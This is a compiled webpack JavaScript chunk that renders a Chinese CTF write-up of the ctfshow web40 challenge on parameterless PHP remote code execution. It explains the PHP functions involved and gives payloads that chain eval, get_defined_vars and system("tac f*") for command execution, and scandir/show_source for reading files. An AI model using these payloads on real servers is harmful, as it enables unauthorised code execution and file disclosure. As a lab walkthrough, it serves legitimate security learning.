(window.webpackJsonp=window.webpackJsonp||[]).push([[36],{392:function(s,t,n){"use strict";n.r(t);var a=n(8),e=Object(a.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"ctfshow-web40-命令执行-php变量函数"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ctfshow-web40-命令执行-php变量函数"}},[s._v("#")]),s._v(" ctfshow web40 命令执行_php变量函数")]),s._v(" "),t("blockquote",[t("p",[s._v("使用php函数让服务器接收并执行自己的命令，获取权限或读取文件")])]),s._v(" "),t("p",[s._v("无参RCE")]),s._v(" "),t("h2",{attrs:{id:"执行命令"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#执行命令"}},[s._v("#")]),s._v(" 执行命令")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("get_defined_vars")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("    "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 获取所有系统定义的变量，用户定义的变量，post,get,file等，返回一个数组")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("next")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("                "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 指向数组中变量的指针")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("array_pop")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("           "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 弹出数组中最后一个元素")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("eval")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("                "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 执行表达式或参数字符串命令")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[s._v("从里到外构造一下，执行最后一个定义的变量")]),s._v(" "),t("p",[s._v("连起来构造"),t("strong",[s._v("无参RCE")]),s._v("：")]),s._v(" "),t("p",[t("strong",[s._v("payload：url/?c=eval(array_pop(next(get_defined_vars())));")])]),s._v(" "),t("p",[s._v("这个c的值会先获取服务器定义的所有变量，再利用这个数组的栈机制和next指针，获取服务器最后一个变量并执行")]),s._v(" "),t("p",[s._v("构造完，他的变量数组最后一个定义的什么以及他会执行什么我们都不知道，用post给他传一个"),t("strong",[s._v('1=system("tac f*");')]),s._v(" 作为最后一个变量并执行")]),s._v(" "),t("h2",{attrs:{id:"读文件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#读文件"}},[s._v("#")]),s._v(" 读文件")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("getcwd")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("            "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#  函数返回当前工作目录。它可以代替pos(localeconv())")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("localeconv")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("        "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#  返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为"."')]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("pos")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("               "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 输出数组第一个元素，不改变指针；")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("current")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("           "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("scandir")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("           "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v('# 函数返回指定目录中的文件和目录的数组。这里因为参数为"."所以遍历当前目录')]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("array_reverse")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("     "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 数组逆置")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("next")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("              "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("show_source")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("       "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 查看源码")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br")])]),t("p",[s._v('每个数组中都有一个内部的指针指向它的"当前"元素，初始指向插入到数组中的第一个元素。')]),s._v(" "),t("p",[s._v("提示：该函数不会移动数组内部指针")]),s._v(" "),t("p",[t("strong",[s._v("payload：url/?c=show_source(next(array_reverse(scandir(getcwd()))));")])]),s._v(" "),t("p",[t("strong",[s._v("payload：url/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));")])]),s._v(" "),t("p",[t("strong",[s._v("类似函数var_export")])])])}),[],!1,null,null,null);t.default=e.exports}}]);